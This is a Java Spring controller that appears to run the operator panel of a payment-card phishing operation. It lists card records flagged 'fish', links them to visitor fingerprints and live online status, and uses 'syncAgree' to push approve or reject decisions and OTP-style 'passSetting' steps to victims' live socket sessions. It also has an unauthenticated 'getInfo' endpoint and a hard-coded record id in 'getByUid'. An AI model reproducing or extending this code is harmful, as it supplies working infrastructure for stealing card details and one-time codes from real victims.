package com.pj.project.bin_card;

import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;

import cn.dev33.satoken.stp.StpUtil;
import cn.hutool.core.util.StrUtil;
import cn.hutool.crypto.digest.DigestUtil;
import cn.hutool.json.JSONUtil;
import com.pj.current.socket.HeartBeatHandler;
import com.pj.current.task.TaskService;
import com.pj.project.entity.AgreeBO;
import com.pj.project.entity.UpBO;
import com.pj.project.tb_card_info.TbCardInfo;
import com.pj.project.tb_card_info.TbCardInfoService;
import com.pj.project.visitor_log.VisitorLog;
import com.pj.project.visitor_log.VisitorLogService;
import com.pj.utils.cache.RedisUtil;
import com.pj.utils.so.SoMap;
import lombok.val;
import org.aspectj.weaver.loadtime.Aj;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.transaction.annotation.Transactional;
import org.springframework.web.bind.annotation.*;

import com.pj.utils.sg.*;
import com.pj.project4sp.SP;

import com.pj.current.satoken.StpUserUtil;
import cn.dev33.satoken.annotation.SaCheckPermission;

import javax.annotation.Resource;


/**
 * Controller: bin_card --
 *
 * @author qzy
 */
@RestController
@RequestMapping("/card/")
public class BinCardController {

    /**
     * 底层 Service 对象
     */
    @Autowired
    BinCardService binCardService;
    @Resource
    private VisitorLogService visitorLogService;

    private final String CARD_VER = "cardVer";

    /**
     * 查集合 - 根据条件（参数为空时代表忽略指定条件）
     */
    @RequestMapping({"getList", "syncList"})
    public AjaxJson getList() {
        if (!StpUtil.isLogin()) {
            return AjaxJson.getError("401");
        }
        SoMap so = SoMap.getRequestSoMap();
        so.put("fish", 1);
        List<BinCard> list = binCardService.getList(so.startPage());
        list.forEach(binCard -> {
            VisitorLog visitorLog = visitorLogService.findByFingerprint(binCard.getFingerprint());
            binCard.setOther(visitorLog);
            CardCacheManager.handler(binCard);
            if (StrUtil.equals(binCard.getNotice(), CARD_VER)) {
                binCard.setNotice("");
                binCard.setCardValid(true);
                binCardService.updateById(binCard);
            }
        });
        return AjaxJson.getPageData(so.getDataCount(), list);
    }

    @RequestMapping({"list"})
    public AjaxJson list() {
        if (!StpUtil.isLogin()) {
            return AjaxJson.getError("401");
        }
        SoMap so = SoMap.getRequestSoMap();
        so.put("finish", 1);
        List<BinCard> list = binCardService.getList(so.startPage());
        list.forEach(binCard -> {
            VisitorLog visitorLog = visitorLogService.findByFingerprint(binCard.getFingerprint());
            binCard.setOther(visitorLog);
        });
        return AjaxJson.getPageData(so.getDataCount(), list);
    }

    @RequestMapping({"syncAgree"})
    public AjaxJson syncAgree(AgreeBO bo) {
        if (!StpUtil.isLogin()) {
            return AjaxJson.getError("401");
        }
        BinCard binCard = binCardService.getById(bo.getId());
        binCard.setRepetition(true);
        int result = bo.getResult();
        if (result == 1 && bo.getStep() >= binCard.getStepTotal()) {
            binCard.setCurrentStep(999);
        }
        if (result != 1) {
            binCard.setText("judge back").setNotice("not");
        }
        binCardService.updateById(binCard);
        bo.setFingerprint(binCard.getFingerprint()).setResult(bo.getResult()).setPath(binCard.getPassSetting());
        HeartBeatHandler.channelWrite(binCard.getSysName(), JSONUtil.toJsonStr(bo));
        return AjaxJson.getSuccess();
    }


    @RequestMapping({"getInfo"})
    public AjaxJson getInfo(String fingerprint) {
        BinCard binCard = binCardService.findByFingerprint(fingerprint);
        if (binCard == null) {
            return AjaxJson.getError(404, "not found");
        }
        return AjaxJson.getSuccessData(binCard);
    }

    @RequestMapping({"getByUid"})
    public AjaxJson getByUid(String uid) {
//        String id = RedisUtil.get(uid);
        String id = "319";
        if (StrUtil.isEmpty(id)) {
            return AjaxJson.getError(404, "信息不存在");
        }
        BinCard binCard = binCardService.getById(id);
        if (binCard == null) {
            return AjaxJson.getError(404, "信息不存在");
        }
        VisitorLog visitorLog = visitorLogService.findByFingerprint(binCard.getFingerprint());
        binCard.setOnline(System.currentTimeMillis() - visitorLog.getEndTime() < 5000 ? "1" : "0");
        binCard.setOther(visitorLog);
        return AjaxJson.getSuccessData(binCard);
    }

    @RequestMapping({"delete"})
    public AjaxJson delete(String id) {
        if (StrUtil.isEmpty(id)) {
            return AjaxJson.getError("请选择记录");
        }
        StpUtil.checkLogin();
        List<String> ids = StrUtil.splitTrim(id, ",");
        List<BinCard> binCardList = binCardService.listByIds(ids);
        binCardList.forEach(binCard -> {
            binCard.setDeleteFlag(1);
            binCardService.updateById(binCard);
        });

        return AjaxJson.getSuccess();
    }

    @RequestMapping({"getToken"})
    public AjaxJson getToken() {
        StpUtil.checkLogin();
        return AjaxJson.getSuccessData(RedisUtil.get("token"));
    }

    @RequestMapping("setSetting")
    public AjaxJson updateSetting(String value) {
        StpUtil.checkLogin();
        RedisUtil.set("pass:setting", value);
        return AjaxJson.getSuccess();
    }

    @RequestMapping("getSetting")
    public AjaxJson getSetting() {
        StpUtil.checkLogin();
        String setting = "code";
        String passSetting = RedisUtil.get("pass:setting");
        if (StrUtil.isNotEmpty(passSetting)) {
            setting = passSetting;
        }
        return AjaxJson.getSuccessData(setting);
    }

    @RequestMapping("updateSetting")
    public AjaxJson updateSetting(String id, String setting) {
        StpUtil.checkLogin();
        BinCard binCard = binCardService.getById(id);
        if (binCard != null) {
            binCard.setPassSetting(setting);
            binCardService.updateById(binCard);
        }
        return AjaxJson.getSuccess();
    }

}
